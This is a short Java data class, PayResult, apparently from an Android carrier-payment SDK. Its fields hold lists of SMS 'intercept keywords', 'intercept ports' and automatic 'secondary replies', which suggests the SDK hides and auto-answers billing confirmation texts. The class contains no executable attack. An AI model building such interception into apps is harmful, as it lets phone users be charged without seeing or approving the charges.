package sdk.hhyk.com.libhhyk_sdk.entity;

import java.util.ArrayList;

public class PayResult extends Result {

	private static final long serialVersionUID = 5263196977858827651L;
	//消费ID
	public int consumerId;
	//指令list
	public ArrayList<CmdEntity> cmdList = new ArrayList<CmdEntity>();
	//拦截关键字list
	public ArrayList<String> keyList = new ArrayList<String>();
	//拦截端口list
	public ArrayList<String> portList = new ArrayList<String>();
	//二次回复list
	public ArrayList<ReplyEntity> replyList = new ArrayList<ReplyEntity>();
	
	public String tipName;
	public String tipTel;
	public int tipIsWi;//提示窗  0隐藏 1显示
	public int tipValue;//窗口   0默认 1基地 2MM 3沃商店 4爱游戏
	
	@Override
	public String toString() {
		return "PayResult [consumerId=" + consumerId + ", cmdList=" + cmdList
				+ ", keyList=" + keyList + ", portList=" + portList
				+ ", replyList=" + replyList + ", tipName=" + tipName
				+ ", tipTel=" + tipTel + ", tipIsWi=" + tipIsWi + ", tipValue="
				+ tipValue + "]";
	}

}
